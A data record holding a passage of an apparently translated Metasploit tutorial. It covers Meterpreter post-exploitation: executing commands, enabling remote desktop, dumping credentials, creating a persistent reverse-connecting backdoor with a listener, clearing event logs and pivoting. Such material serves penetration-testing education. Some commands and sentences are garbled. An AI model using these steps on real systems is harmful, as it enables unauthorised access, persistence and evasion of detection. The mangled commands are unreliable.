- fmt: "\nIn Meterpreter, penetration testers can also use the `execute` command to\
    \ execute applications on the target system.\n\nThe syntax format of this command\
    \ is as follows:\n\n`execute [options] -f command`\n\nThe execution command is\
    \ as follows:\n\n```\nmeterpreter> execute -s 1-f cmd\n```\n\nProcess 2260 created.\n\
    \nAs you can see from the output information, a process with ID `2260` was created.\
    \ At this point, you can see the started `CMD` program on the target host.\n\n\
    ## Enable remote desktop\n\nIn Meterpreter, users can also start a remote desktop\
    \ to connect to the target host remotely. The following describes how to enable\
    \ remote desktop and log in remotely.\n\nThe execution command is as follows:\n\
    \n```\nmeterpreter> run post/windows/manage/enable_rdp\n```\n\nSeeing the above\
    \ output information indicates that the remote desktop has been successfully started.\
    \ Next, the user also needs to check the idle time of the remote user.\n\nThe\
    \ execution command is as follows:\n\n```\nmeterpreter> idletime\n```\n\nUser\
    \ has been idle for: 23 days 7 hours 16 mins 52 secs\n\nIt can be seen from the\
    \ output information that the user’sThe idle time is 23 days, 7 hours, 16 minutes\
    \ and 52 seconds. Next, the penetration tester can remotely access the desktop\
    \ of the target host.\n\nThe user can obtain the username and password of the\
    \ target host through some methods, such as `hashdump` command and `mimikatz`\
    \ module. At this point, the user can use the obtained user information to remotely\
    \ connect to the target host in the Kali host.\n\nThe following will use the `rdesktop`\
    \ command to connect to the desktop remotely.\n\n1) The execution command is as\
    \ follows:\n\n```\nroot@exampleserver:～# rdesktop 192.168.29.143\n```\n\nAfter\
    \ executing the above command, a remote desktop will open.\n\n2) Select the logged-in\
    \ user on this interface to log in to the target host. Select the \"other users\"\
    \ option here, and the interface will be displayed.\n\n3) Enter the user name\
    \ and password for remote login in this interface. Then, click the login button,\
    \ you can successfully connect to the remote desktop. From this interface, you\
    \ can see that you have successfully connected to the remote desktop of the target\
    \ host.\n\n## Chapter 34\n\n### Persistent Backdoor\n\n![](image_rsrc49Z.jpg)\n\
    \nAfter successfully obtaining access to the target system, the penetration tester\
    \ certainly does not want to regain access in the same laborious way. Since Meterpreter\
    \ is a connection established based on a memory DLL, as long as the target host\
    \ is shut down, the Meterpreter connection will be disconnected.\n\nTherefore,\
    \ in order to facilitate subsequent penetration testing, a durable backdoor can\
    \ be created. In this way, as long as the target host is powered on, it will automatically\
    \ establish a connection with the attacking host. Moreover, when a persistent\
    \ backdoor is created, even if the connection is interrupted, it will not affect\
    \ the work. The following will introduce the use of `run persistence` command\
    \ to create a persistent backdoor.\n\nAmong them, the syntax format is as follows:\n\
    \n`run persistence -X -i -p -r`\n\nUse the `run persistence` command to create\
    \ a persistent backdoor.\n\nThe execution command is as follows:\n\n```\nmeterpreter>\
    \ run persistence -X -i 5-p 8888192.168.29.134\n```\n\nFrom the output information,\
    \ we can see that an executable script is created in the target host. Among them,\
    \ the script file name is `MIknXebtV.vbs`. At this point, the user can see the\
    \ file in the `C:\\Windows\\TEMP` directory of the target host.\n\nAfter the user\
    \ creates a persistent backdoor on the target host, it also needs to establish\
    \ a listener locally. In this way, when the target host restarts, it can automatically\
    \ establish a connection with the attacking host. The following will use the `exploit/multi/handler`\
    \ module to establish a monitor.\n\n1) Select the `exploit/multi/handler` module.\n\
    \nThe execution command is as follows:\n\n```\nmsf5> use exploit/multi/handler\n\
    msf5 exploit(multi/handler)>\n```\n\n2) Load the attack payload and view the configuration\
    \ options.\n\nThe execution command is as follows:\n\n```\nmsf5 exploit(multi/handler)>\
    \ set payload windows/meterpreter/reverse_tcp\n```\n\nAs you can see from the\
    \ output information, the required item `LHOST` has not been configured yet. Moreover,\
    \ the port monitored by this module is `4444`. Since port `4444` has been monitored\
    \ before, we will modify another monitoring port, such as `8888`.\n\n3) Configure\
    \ attack payload options.\n\nThe execution command is as follows:\n\n```\nmsf5\
    \ exploit(multi/handler)> set LHOST 192.168.29.134\nLHOST => 192.168.29.134\n\
    msf5 exploit(multi/handler)> set LPORT 8888\nLPORT => 8888\n```\n\n4) Establish\
    \ monitoring.\n\nThe execution command is as follows:\n\n```\nmsf5 exploit(multi/handler)>\
    \ exploit\n```\n\n[＊] Started reverse TCP handler on 192.168.29.134:8888\n\nFrom\
    \ the output information, we can see that the current host is listening on port\
    \ `8888` and the IP address is `192.168.29.134`.\n\n5) When the target host restarts,\
    \ it will actively establish a connection with the attacking host. as follows:\n\
    \n[＊] Sending stage (192.168.29.134)\n\nFrom the output information, we can see\
    \ that the current host was successfully opened.\n\n## Clear trace\n\nWhen the\
    \ penetration tester invades the target host, all operations will be recorded\
    \ in the log file. Therefore, in order not to be discovered by the target system,\
    \ it is important to clear the trace. At this point, the user can use the `clearev`\
    \ command.\n\nThe execution command is as follows:\n\n```\nmeterpreter> clearev\n\
    ```\n\nYou can see the cleared from the output information. Among them, 90.\n\n\
    ## Build a springboard\n\nSpringboard refers to using a vulnerable host that has\
    \ been attacked as a springboard to penetrate systems that cannot be directly\
    \ accessed due to routing issues. The method of building a springboard will be\
    \ introduced below.\n\nThe specific steps are as follows:\n\n1) Open the obtained\
    \ Meterpreter session.\n\nThe execution command is as follows:\n\n```\n[＊] Meterpreter\
    \ session 1 opened (192.168.2.10:4444) at 2019-04-17 15:56:24 +0800\nmeterpreter>\n\
    ```\n\nFrom the addresses of the above session, you can see that the address of\
